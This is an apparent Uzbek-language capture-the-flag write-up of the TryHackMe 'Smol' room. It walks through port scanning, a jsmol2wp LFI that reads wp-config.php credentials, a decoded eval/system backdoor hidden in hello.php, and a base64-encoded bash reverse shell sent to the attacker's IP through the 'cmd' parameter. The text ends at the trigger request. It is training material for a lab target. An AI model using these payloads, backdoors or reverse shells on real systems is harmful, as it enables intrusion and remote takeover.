# Smol

Room: https://tryhackme.com/room/smol

Ishni boshlashdan oldin):

```
sudo echo "10.10.8.88 www.smol.thm smol.thm" >> /etc/hosts
```





## Razvetka

Port Scanning:

```
╭─mete   󰉖 ~/THM/THM-LABS/0207-2025
╰─ ❯❯ rustscan -a 10.10.8.88 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.8.88:22
Open 10.10.8.88:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.8.88
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 01:23 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 01:23
Scanning 10.10.8.88 [2 ports]
Completed Ping Scan at 01:23, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:23
Completed Parallel DNS resolution of 1 host. at 01:23, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:23
Scanning 10.10.8.88 [2 ports]
Discovered open port 22/tcp on 10.10.8.88
Discovered open port 80/tcp on 10.10.8.88
Completed Connect Scan at 01:23, 0.21s elapsed (2 total ports)
Initiating Service scan at 01:23
Scanning 2 services on 10.10.8.88
Completed Service scan at 01:23, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.8.88.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 01:23
Completed NSE at 01:23, 0.90s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 01:23
Completed NSE at 01:23, 0.84s elapsed
Nmap scan report for 10.10.8.88
Host is up, received syn-ack (0.21s latency).
Scanned at 2025-07-03 01:23:08 +05 for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.72 seconds
```

22 va 80 ochiq.

WhatWeb orqali veb sayt texnalogiyalarini aniqlaymiz:

```
╭─mete   󰉖 ~/THM/THM-LABS/0207-2025
╰─ ❯❯ whatweb http://www.smol.thm/
http://www.smol.thm/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[admin@smol.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.8.88], JQuery[3.7.1], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[AnotherCTF], UncommonHeaders[link], WordPress[6.7.1]
```

**WPScan**'dan foydalanamiz:

```
wpscan --url http://www.smol.thm/
```

Meni qiziqtirgan report:

```
[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

Va bu plugin uchun topilgan zaiflik:

https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/

LFI topildi.

## Web Hacking

Qo'llash:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

Natija:

```

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```



Foydalanuvchilarni enumerate qilamiz.

Buyruq:

```
wpscan --url http://www.smol.thm/ --enumerate u
```

Natija:

```

[i] User(s) Identified:

[+] Jose Mario Llado Marti
 | Found By: Rss Generator (Passive Detection)

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] think
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wp
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] gege
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] diego
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] xavi
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

LFI orqali wp-config.php'dagi login parollardan foydalanib saytga kirishga harakat qilamiz.

1. http://www.smol.thm/wp-admin/

2. Login: wpuser

   Password: kbLSF2Vop#lw3rjDZ629*Z%G

Bingo!

Chop etilmagan post topdim.

```
http://www.smol.thm/wp-admin/post.php?post=58&action=edit
```

Aytilishi bo'yicha "hello" doir **source code** topishimiz kerak. Ho'p. LFIga qaytamiz.

Topildi:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```

Natja qismi:

```
// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}
```

Qiziq CyberChiefdan foydalanib koddan chiqarib ko'rish kerak.

Dekodlangan ko'rinishi:

```

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
```

Qiziq)

GPT Brat:

```
Bu yozilganlar ASCII escape code (yoki Python’dagi \xNN shaklidagi hexadecimal) ko‘rinishidagi belgilar ketma-ketligidir. Uni oddiy matnga dekod qilsak:

1. \143\x6d\x64
Bu \x formatidagi ASCII kodlar:

\143 → c

\x6d → m

\x64 → d

✅ Natija: cmd

2. \143\155\x64
Bu aralash shakl (\NN va \xNN):

\143 → c

\155 → m

\x64 → d

✅ Natija: cmd
```

shunda **wp-admin**'da cmd nomli parametr bor va unga base 64 ko'rinishida buyruq joylay olamiz).

Nega base64? Filter bo'lsa aylanib o'tish uchun)

Reverse Shell tayyorlash:

Bash Reverse shell:

```
bash -c 'bash -i >& /dev/tcp/10.8.24.135/4444 0>&1'
```

Base64 kodlash:

```
mete@sec> echo "bash -c 'bash -i >& /dev/tcp/10.8.24.135/4444 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI0LjEzNS80NDQ0IDA+JjEnCg==
```

Reverse shellni qabul qilish:

```
nc -lvnp 4444
```

So'rov yuborish:

```
http://www.smol.thm/wp-admin/index.php?cmd=echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI0LjEzNS80NDQ0IDA+JjEnCg==" | base64 -d | bash
```

